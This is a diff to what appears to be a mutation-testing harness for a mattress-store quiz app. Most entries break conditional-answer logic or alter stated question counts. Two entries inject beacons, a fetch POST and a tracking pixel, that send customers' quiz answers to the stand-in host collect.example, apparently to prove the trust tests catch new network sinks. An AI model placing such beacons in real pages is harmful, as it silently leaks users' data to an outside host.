@@ -1307,12 +1307,15 @@ const MUTATIONS = [
   ["trust: the Review line reverts to the inline claim that the specialist builds the matches",
     "      if (help) help.textContent = t('review.help');",
     "      if (help) help.textContent = 'A quick check, then your specialist builds your recommendations.';", TRUST],
+  // The anchor moved with the A4.3 corrective pass: reconcileConditionalAnswers()
+  // now runs between the answer write and the rerender. Same insertion point,
+  // same property - selectOption() must never acquire a network sink.
   ["trust: a third network sink appears (a beacon carrying the answers)",
-    "        answers[qId] = optId;\n      }\n      renderQuestion();",
-    "        answers[qId] = optId;\n      }\n      fetch ('https://collect.example/a', { method: 'POST', body: JSON.stringify(answers) });\n      renderQuestion();", TRUST],
+    "        answers[qId] = optId;\n      }\n      reconcileConditionalAnswers(conditionsBefore);\n      renderQuestion();",
+    "        answers[qId] = optId;\n      }\n      reconcileConditionalAnswers(conditionsBefore);\n      fetch ('https://collect.example/a', { method: 'POST', body: JSON.stringify(answers) });\n      renderQuestion();", TRUST],
   ["trust: a pixel beacon carries the answers to an external host",
-    "        answers[qId] = optId;\n      }\n      renderQuestion();",
-    "        answers[qId] = optId;\n      }\n      document.createElement('img').src = 'https://collect.example/p?a=' + encodeURIComponent(JSON.stringify(answers));\n      renderQuestion();", TRUST],
+    "        answers[qId] = optId;\n      }\n      reconcileConditionalAnswers(conditionsBefore);\n      renderQuestion();",
+    "        answers[qId] = optId;\n      }\n      reconcileConditionalAnswers(conditionsBefore);\n      document.createElement('img').src = 'https://collect.example/p?a=' + encodeURIComponent(JSON.stringify(answers));\n      renderQuestion();", TRUST],
   ["trust: the Spanish data-use variant silently becomes English",
     '"privacy.data_use_preview": "Durante esta sesión en la tienda,',
     '"privacy.data_use_preview": "During this showroom session,', TRUST, "data/dict-es.json"],
@@ -2336,6 +2339,52 @@ const MUTATIONS = [
     '        "es": "\u00bfQu\u00e9 tama\u00f1o de colch\u00f3n buscas?"',
     '        "es": 12345',
     A43, "data/quiz.json"],
+  // --- A4.3 corrective pass (2026-09-04): the conditional-answer invariant.
+  // The reduction shipped without reconciliation, so editing partner_sleep on
+  // the review left the dependent answer behind: a solo consultation kept
+  // scoring a partner's movement answer, and the reverse edit returned to the
+  // review with the machine's own sentinel standing in for a customer answer.
+  // These seven entries are the ways the ONE rule can be undone - the
+  // reconciler unhooked, the sentinel unwritten, the clear disabled in either
+  // of its two forms, a withdrawn option left standing, and the review's door
+  // check defeated at the door, at the Back control or in the probe itself.
+  // Each was proved red in a sandbox before being written down.
+  ["conditional answers: the reconciler stops running when an answer changes (a stale movement answer outlives the edit)",
+    "      reconcileConditionalAnswers(conditionsBefore);\n      renderQuestion();",
+    "      renderQuestion();",
+    A43],
+  ["conditional answers: the before-snapshot is discarded, so a sentinel is never recognised as machine-written",
+    "      var conditionsBefore = conditionalConditionsHold();",
+    "      var conditionsBefore = null;",
+    A43],
+  ["conditional answers: a machine-written sentinel survives a question becoming askable (solo -> partner finishes on not_applicable)",
+    "          } else if (wasHidden[q.id] === true && answers[q.id] === 'not_applicable') {",
+    "          } else if (false && wasHidden[q.id] === true) {",
+    A43],
+  ["conditional answers: an option withdrawn by hideIf is left standing as the stored answer (a partner-only option keeps scoring for a solo sleeper)",
+    "          } else if (val === opt.id) {\n            delete answers[q.id];\n          }",
+    "          } else if (false) {\n            delete answers[q.id];\n          }",
+    A43],
+  ["conditional answers: the review stops checking for an outstanding conditional answer at its door",
+    "      var pending = pendingConditionalIndex();",
+    "      var pending = -1;",
+    A43],
+  ["conditional answers: Back in edit mode ignores the outstanding question (the Back control goes dead instead of stepping to the trigger)",
+    "      if (editingFromReview && pendingConditionalIndex() < 0) {",
+    "      if (editingFromReview) {",
+    A43],
+  ["conditional answers: the outstanding-question probe never reports anything",
+    "        if (val === undefined || val === null || val === '') return i;",
+    "        if (false) return i;",
+    A43],
+  // The living-contract half of the same corrective pass: the reduction left
+  // eleven operational statements claiming ten questions, including both
+  // onboarding guides. The counts are now pinned FROM data/quiz.json, so this
+  // entry proves the pin is load-bearing rather than decorative.
+  ["living contract: a principal guide keeps the old question and option counts after a reduction",
+    "The 9 quiz questions (42 options;",
+    "The 10 quiz questions (47 options;",
+    A43, "CLAUDE.md"],
   // --- A4.2 corrective pass: the feature-tag normalization contract. The A4.2
   // reachability gate compared RAW CSV spellings to camelCase quiz keys, so a
   // kebab-case source the generator normalizes correctly read as unreachable.
@@ -2736,7 +2785,9 @@ process.on("exit", () => { try { rmSync(sandbox, { recursive: true, force: true 
 // `images` joins the copy set because the rendered layout suite (a
 // consolidation-pass observer) serves the sandbox over HTTP and letterboxes
 // the banner-crop sources.
-for (const d of ["tests", "data", "docs", "tools", "incoming", "demo", ".github", "images"]) {
+// `onboarding` joins the copy set because the A4.3 living-contract section
+// pins the question and option counts stated in the two onboarding guides.
+for (const d of ["tests", "data", "docs", "tools", "incoming", "demo", ".github", "images", "onboarding"]) {
   cpSync(join(root, d), join(sandbox, d), { recursive: true });
 }
 // CLAUDE.md joins the copy set because the trust suite pins that it carries no
@@ -2744,7 +2795,9 @@ for (const d of ["tests", "data", "docs", "tools", "incoming", "demo", ".github"
 // build-data.ps1 joins the copy set because the a31 product-proof content
 // section pins the bilingual emission rules of the generated mattress JSON
 // (story / trial cue / proofs / construction) at their source.
-for (const f of ["index.html", "Code.gs", "CLAUDE.md", "build-data.ps1"]) cpSync(join(root, f), join(sandbox, f));
+// README.md joins the copy set for the same reason as onboarding: the A4.3
+// living-contract section reads the counts it states.
+for (const f of ["index.html", "Code.gs", "CLAUDE.md", "build-data.ps1", "README.md"]) cpSync(join(root, f), join(sandbox, f));
 
 // Per-target pristine sources. Entries name their target with a fifth field;
 // index.html is the default. Every mutated target is restored before the next
@@ -2770,6 +2823,10 @@ const PRISTINE_BY_FILE = {
   // `experience` bypass shipped green.
   "tools/validation.py":
     readFileSync(join(sandbox, "tools", "validation.py"), "utf8"),
+  // A4.3 corrective: the living nine-question contract. The quiz-reduction
+  // suite reads the counts stated in the principal guides and compares them to
+  // data/quiz.json, so CLAUDE.md is a mutation target like any other source.
+  "CLAUDE.md": readFileSync(join(sandbox, "CLAUDE.md"), "utf8"),
   // Trust gate: the generated quiz copy and the correspondence document that
   // governs it. Mutating each proves the suite compares them rather than
   // trusting either.
